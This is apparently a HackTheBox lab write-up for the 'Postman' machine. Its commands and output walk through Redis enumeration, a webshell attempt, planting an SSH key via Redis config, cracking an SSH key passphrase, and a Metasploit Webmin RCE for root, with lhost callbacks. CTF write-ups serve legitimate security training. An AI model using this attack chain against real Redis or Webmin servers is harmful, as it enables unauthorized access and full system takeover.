---
title: HTB | Postman
author: Zeropio
date: 2023-01-01
categories: [Pentesting, HackTheBox]
tags: [htb, linux, easy, machines]
permalink: /pentesting/htb/machines/postman
image:
  path: /assets/img/hackthebox/card/Postman.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46834ff13861c01c74cbb5d14a684d77 (RSA)
|   256 2d8d27d2df151a315305fbfff0622689 (ECDSA)
|_  256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

Some of this version have exploits.

### Apache

The technologies used are:

```
http://10.10.10.160/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.160], JQuery, Script, Title[The Cyber Geek's Personal Website], X-UA-Compatible[IE=edge
```

Fuzzing will show:

```
upload                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 44ms]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 43ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 2421ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 2423ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 4453ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 46ms]
                        [Status: 200, Size: 3844, Words: 1027, Lines: 92, Duration: 55ms]
index.html              [Status: 200, Size: 3844, Words: 1027, Lines: 92, Duration: 51ms]
.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 42ms]
style.css               [Status: 200, Size: 24465, Words: 4058, Lines: 1422, Duration: 44ms]
.                       [Status: 200, Size: 3844, Words: 1027, Lines: 92, Duration: 46ms]

```

### Redis

We can do a further enumeration of the Redis server:

```
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 668
|   Used CPU (sys): 1.62
|   Used CPU (user): 0.53
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 821.52K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.7
```

With `redis-cli` we will connect and get general information with `info`:

```console
$ redis-cli -h 10.10.10.160
10.10.10.160:6379> info
# Server
redis_version:4.0.9
```

Only the attack machine is connected:

```console
$ 10.10.10.160:6379> client list
id=16 addr=10.10.14.7:51346 fd=8 name= age=157 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=client
```

There doesn’t seem to be any database:

```console
$ 10.10.10.160:6379> info keyspace
# Keyspace
$ 10.10.10.160:6379>
```

The version is under ******5.0******, so [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) should work. But the shell doesn’t seem to work:

```console
$ python3 redis-rogue-server.py --rhost 10.10.10.160 --lhost 10.10.14.7

[<<] whoami
[<<] id
[<<]
```

Trying a webshell doesn’t success:

```console
10.10.10.160:6379> config set dir /usr/share/apache2/default-site
OK
10.10.10.160:6379> config set dbfilename redis.php
OK
10.10.10.160:6379> set test "<?php phpinfo(); ?>"
OK
10.10.10.160:6379> save
(error) ERR
```

### Webmin

This page is a typical webmin web:

```
http://10.10.10.160:10000/ [200 OK] Country[RESERVED][ZZ], HTTPServer[MiniServ/1.910], IP[10.10.10.160]
```

---

# Footprint

## Initial Access

We can try adding an SSH connection:

```console
$ ssh-keygen -t rsa
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt
$ cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key 
OK
```

Add the SSH key:

```console
$ redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
```

And we can connect:

```console
$ ssh -i id_rsa redis@10.10.10.160
```

## Privilege Escalation

### User

We can get the user:

```console
redis@Postman:~$ ls /home
Matt
```

We can get a list of all the avaible ports:

```console
redis@Postman:/$ nc -z -v 127.0.0.1 1-65535 2>&1 | grep -v 'Connection refused'
Connection to 127.0.0.1 22 port [tcp/ssh] succeeded!
Connection to 127.0.0.1 80 port [tcp/http] succeeded!
Connection to 127.0.0.1 6379 port [tcp/*] succeeded!
Connection to 127.0.0.1 10000 port [tcp/webmin] succeeded!
Connection to 127.0.0.1 38582 port [tcp/*] succeeded!

redis@Postman:/$ nc -z -v 127.0.0.1 1-65535 2>&1 | grep -v 'Connection refused'
Connection to 127.0.0.1 22 port [tcp/ssh] succeeded!
Connection to 127.0.0.1 80 port [tcp/http] succeeded!
Connection to 127.0.0.1 6379 port [tcp/*] succeeded!
Connection to 127.0.0.1 10000 port [tcp/webmin] succeeded!
Connection to 127.0.0.1 41690 port [tcp/*] succeeded!
Connection to 127.0.0.1 54148 port [tcp/*] succeeded!
```

Some ports are moving, so we can ignore them. There is a RSA in `/opt/id_rsa.bak`{: .filepath} owned by ********Matt********. Cracking it display the following password:

```console
$ ssh2john id_rsa > hash.txt
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /home/zeropio/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)
```

But using it will display an error:

```console
$ ssh Matt@10.10.10.160 -i id_rsa
Enter passphrase for key 'id_rsa': 
Connection closed by 10.10.10.160 port 22
```

But the password will work for the user:

```console
redis@Postman:/tmp$ su Matt
Password: 
Matt@Postman:/tmp$
```

### Root

We can use this credentials for the webmin web. There, we can use metasploit:

```console
msf6> use exploit/linux/http/webmin_packageup_rce
msf6 exploit(linux/http/webmin_packageup_rce) > set username Matt
msf6 exploit(linux/http/webmin_packageup_rce) > set password computer2008
msf6 exploit(linux/http/webmin_packageup_rce) > set lhost tun0
msf6 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
msf6 exploit(linux/http/webmin_packageup_rce) > set ssl true
msf6 exploit(linux/http/webmin_packageup_rce) > run
```

And we are root.
